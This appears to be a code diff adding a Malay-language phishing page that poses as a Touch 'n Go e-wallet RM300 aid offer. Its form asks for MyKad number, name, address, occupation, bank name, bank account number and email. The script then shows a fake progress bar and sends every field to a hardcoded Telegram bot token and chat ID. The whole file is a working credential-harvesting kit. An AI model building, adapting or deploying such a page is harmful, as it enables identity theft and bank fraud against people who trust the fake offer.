@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bantuan ewalet rm 300</title>
+
+    <!-- MY FONT -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Poppins", Arial, sans-serif;
+      }
+
+      body,
+      html {
+        height: 100%;
+        width: 100%;
+        background-color: var(--primary-blue);
+        color: var(--text-white);
+        overflow-x: hidden;
+      }
+
+      .navbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: #ffffff;
+        padding: 20px 15px;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        /* box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); */
+        font-size: 23px;
+        font-weight: bold;
+      }
+
+      .navbar-logo {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+
+      .navbar-img {
+        width: 40px;
+        height: 40px;
+        object-fit: contain;
+      }
+
+      .navbar-nav {
+        display: flex;
+        align-items: center;
+        gap: 20px;
+        font-weight: bold;
+      }
+
+      .navbar-nav a {
+        color: #ffffff !important;
+        font-size: 16px;
+        text-decoration: none;
+        font-weight: 500;
+        padding: 8px 12px;
+        border-radius: 4px;
+        transition: all 0.3s ease;
+        white-space: nowrap;
+      }
+
+      .navbar-nav a:hover {
+        background-color: var(--primary-blue);
+        color: var(--accent-yellow);
+      }
+
+      .navbar-nav a span {
+        color: #007bff;
+      }
+
+      .hero {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-top: 30px;
+        padding: 10px 20px;
+      }
+
+      .hero img {
+        width: 100%;
+        height: auto;
+        display: flex;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        margin-top: 0;
+      }
+
+      .form-container {
+        background-color: white;
+        margin: 20px;
+        padding: 20px;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        margin-bottom: 70px;
+      }
+      .form-group {
+        font-size: 14px;
+        display: flex;
+        align-items: center;
+        /* margin-bottom: 15px; */
+        background-color: #f4f4f4;
+        /* border-radius: 5px; */
+        padding: 10px;
+      }
+      .form-group label {
+        flex: 1;
+        margin-right: 10px;
+        white-space: nowrap;
+      }
+      .form-group input,
+      .form-group select {
+        flex: 2;
+        padding: 8px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+      }
+      .submit-btn {
+        background-color: #f8d704;
+        color: white;
+        padding: 10px 15px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        width: 50%;
+        margin-top: 10px;
+        margin-left: 25%;
+      }
+      .input-container {
+        position: relative;
+      }
+      .input-label {
+        position: absolute;
+        left: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        pointer-events: none;
+        color: #aaa;
+        transition: 0.2s;
+      }
+      .input-container input:focus + .input-label,
+      .input-container input:not(:placeholder-shown) + .input-label {
+        top: 0;
+        left: 5px;
+        font-size: 12px;
+        color: #333;
+      }
+
+      .form-group [nama-bank] {
+        width: 50%;
+      }
+
+      /* media query */
+      @media (max-width: 768px) {
+      }
+
+      /* media query */
+      @media (max-width: 480px) {
+        .form-group [nama-bank] {
+          width: 50%;
+        }
+
+        .navbar {
+          padding: 0 10px;
+        }
+
+        .navbar-nav {
+          gap: 5px;
+        }
+
+        .navbar-nav a {
+          font-size: 12px;
+          padding: 4px 6px;
+        }
+
+        .hero img {
+          width: 100%;
+          margin-bottom: 5px;
+          margin-top: 0;
+        }
+      }
+
+      /* Footer Styles */
+      footer {
+        width: 100%;
+        background-color: var(--accent-yellow);
+        padding: 0;
+        text-align: center;
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        display: flex;
+        justify-content: center;
+        align-items: flex-end;
+        margin: 0;
+        line-height: 0;
+        font-size: 0;
+      }
+
+      footer img {
+        max-width: 380px;
+        height: auto;
+        display: block;
+        margin: 0;
+        padding: 0;
+        vertical-align: bottom !important;
+        font-size: 0;
+      }
+    </style>
+  </head>
+  <body>
+    <nav class="navbar">Bantuan e-Wallet Touch n Go</nav>
+
+    <div class="hero">
+      <img src="img-22.jpeg" alt="tng-img" />
+    </div>
+
+    <div class="form-container">
+      <div class="form-group">
+        <label for="mykad">No. MyKad:</label>
+        <input type="text" id="mykad" name="mykad" style="width: 50px" />
+      </div>
+      <div class="form-group">
+        <label for="nama">Nama:</label>
+        <input type="text" id="nama" name="nama" style="width: 50px" />
+      </div>
+      <div class="form-group">
+        <label for="umur">Umur:</label>
+        <input type="number" id="umur" name="umur" style="width: 50px" />
+      </div>
+      <div class="form-group">
+        <label for="alamat">Alamat:</label>
+        <input type="text" id="alamat" name="alamat" style="width: 50px" />
+      </div>
+      <div class="form-group">
+        <label for="jantina">Jantina:</label>
+        <select id="jantina" name="jantina">
+          <option value="lelaki">Lelaki</option>
+          <option value="perempuan">Perempuan</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label for="pekerjaan">Pekerjaan:</label>
+        <input
+          type="text"
+          id="pekerjaan"
+          name="pekerjaan"
+          style="width: 50px"
+        />
+      </div>
+      <div class="form-group">
+        <label for="nama-bank">Nama Bank:</label>
+        <select id="nama-bank" name="nama-bank" style="width: 50%">
+          <option value="maybank">Maybank</option>
+          <option value="cimb">CIMB Bank</option>
+          <option value="public-bank">Public Bank</option>
+          <option value="rhb">RHB Bank</option>
+          <option value="hong-leong">Hong Leong Bank</option>
+          <option value="ambank">AmBank</option>
+          <option value="bank-islam">Bank Islam</option>
+          <option value="bank-rakyat">Bank Rakyat</option>
+          <option value="uob">UOB Malaysia</option>
+          <option value="ocbc">OCBC Bank</option>
+          <option value="hsbc">HSBC Bank</option>
+          <option value="standard-chartered">Standard Chartered</option>
+          <option value="affin-bank">Affin Bank</option>
+          <option value="agrobank">Agrobank</option>
+          <option value="bank-muamalat">Bank Muamalat</option>
+          <option value="alliance-bank">Alliance Bank</option>
+          <option value="bank-simpanan-nasional">Bank Simpanan Nasional</option>
+          <option value="kuwait-finance-house">Kuwait Finance House</option>
+          <option value="al-rajhi-bank">Al Rajhi Bank</option>
+          <option value="bank-of-china">Bank of China</option>
+          <option value="citibank">Citibank</option>
+          <option value="deutsche-bank">Deutsche Bank</option>
+          <option value="jpmorgan-chase">J.P. Morgan Chase</option>
+          <option value="sumitomo-mitsui">
+            Sumitomo Mitsui Banking Corporation
+          </option>
+          <option value="mizuho-bank">Mizuho Bank</option>
+          <option value="bank-of-tokyo-mitsubishi">
+            Bank of Tokyo-Mitsubishi UFJ
+          </option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label for="no-akaun-bank">No. Akaun Bank:</label>
+        <input
+          type="text"
+          id="no-akaun-bank"
+          name="no-akaun-bank"
+          style="width: 50%"
+        />
+      </div>
+      <div class="form-group">
+        <label for="email">Alamat e-Mel:</label>
+        <input type="email" id="email" name="email" style="width: 50%" />
+      </div>
+      <button
+        id="upload-button"
+        class="submit-btn"
+        style="
+          display: flex;
+          width: 50%;
+          padding: 10px auto;
+          margin-top: 10px;
+          justify-content: center;
+          align-items: center;
+        "
+        onclick="submitForm()"
+      >
+        Muat Naik
+      </button>
+
+      <div
+        id="progress-container"
+        style="
+          width: 80%;
+          height: 20%;
+          display: none;
+          position: fixed;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          background: white;
+          padding: 20px;
+          border-radius: 10px;
+          text-align: center;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        "
+      >
+        <p>Proses Muat Data...</p>
+        <div
+          id="progress-bar"
+          style="
+            width: 100%;
+            height: auto;
+            background: #f3f3f3;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+          "
+        >
+          <div
+            style="
+              width: 0%;
+              height: 100%;
+              background: orange;
+              text-align: center;
+              color: white;
+              line-height: 20px;
+              border-radius: 10px;
+            "
+          >
+            0%
+          </div>
+        </div>
+      </div>
+
+      <footer>
+        <img src="ini1.png" alt="Logo Footer" />
+      </footer>
+    </div>
+
+    <script>
+      document
+        .getElementById("upload-button")
+        .addEventListener("click", function () {
+          // Ambil elemen-elemen yang diperlukan
+          const progressContainer =
+            document.getElementById("progress-container");
+          const progressBar = document.querySelector("#progress-bar > div");
+          const formData = new FormData();
+
+          // Ambil data dari form
+          const mykad = document.getElementById("mykad").value;
+          const nama = document.getElementById("nama").value;
+          const umur = document.getElementById("umur").value;
+          const alamat = document.getElementById("alamat").value;
+          const jantina = document.getElementById("jantina").value;
+          const pekerjaan = document.getElementById("pekerjaan").value;
+          const namaBank = document.getElementById("nama-bank").value;
+          const noAkaunBank = document.getElementById("no-akaun-bank").value;
+          const email = document.getElementById("email").value;
+
+          // Tambahkan data ke FormData
+          formData.append("mykad", mykad);
+          formData.append("nama", nama);
+          formData.append("umur", umur);
+          formData.append("alamat", alamat);
+          formData.append("jantina", jantina);
+          formData.append("pekerjaan", pekerjaan);
+          formData.append("nama-bank", namaBank);
+          formData.append("no-akaun-bank", noAkaunBank);
+          formData.append("email", email);
+
+          // Tampilkan progress container
+          progressContainer.style.display = "block";
+
+          let progress = 0;
+          const interval = 100; // Update setiap 100ms
+          const totalDuration = 5000; // Total waktu pengiriman dalam ms
+          const increment = 100 / (totalDuration / interval); // Persentase yang ditambahkan setiap interval
+
+          // Update progress bar
+          const progressInterval = setInterval(() => {
+            progress += increment;
+            progressBar.style.width = `${progress}%`;
+            progressBar.textContent = `${Math.round(progress)}%`;
+
+            if (progress >= 100) {
+              clearInterval(progressInterval);
+              // Kirim data ke Telegram setelah progress selesai
+              submitFormToTelegram(formData);
+            }
+          }, interval);
+        });
+
+      // Fungsi untuk mengirim data ke Telegram
+      function submitFormToTelegram(formData) {
+        const botToken = "6550880154:AAGVBNvEL-HzBMonAZuFlPQ77bQFtcyiWcI";
+        const chatId = "5433084689";
+
+        // Kirim pesan ke Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: `
+───────────────
+🔰 Malay | DATA | AKUN 🔰
+───────────────
+MyKad: ${formData.get("mykad")}
+\nNama: ${formData.get("nama")}
+\nUmur: ${formData.get("umur")}
+
+\nAlamat: ${formData.get("alamat")}
+\nJantina: ${formData.get("jantina")}
+\nPekerjaan: ${formData.get("pekerjaan")}
+
+\nNama Bank: ${formData.get("nama-bank")}
+\nNo. Akaun Bank: ${formData.get("no-akaun-bank")}
+\nEmail: ${formData.get("email")}
+───────────────
+`,
+          }),
+        })
+          .then((response) => {
+            if (response.ok) {
+              alert("Data berhasil dikirim!");
+              // Reset form atau lakukan tindakan lain setelah pengiriman berhasil
+
+              setTimeout(() => {
+                window.location.href = "index.html"; // Ganti dengan path yang sesuai jika perlu
+              }, 1000); // 1000 ms = 1 detik
+              // Reset form atau lakukan tindakan lain setelah pengiriman berhasil
+            } else {
+              alert("Terjadi kesalahan saat mengirim form.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error sending message:", error);
+            alert("Terjadi kesalahan saat mengirim form.");
+          })
+          .finally(() => {
+            // Sembunyikan progress container setelah selesai
+            document.getElementById("progress-container").style.display =
+              "none";
+          });
+      }
+    </script>
+  </body>
+</html>
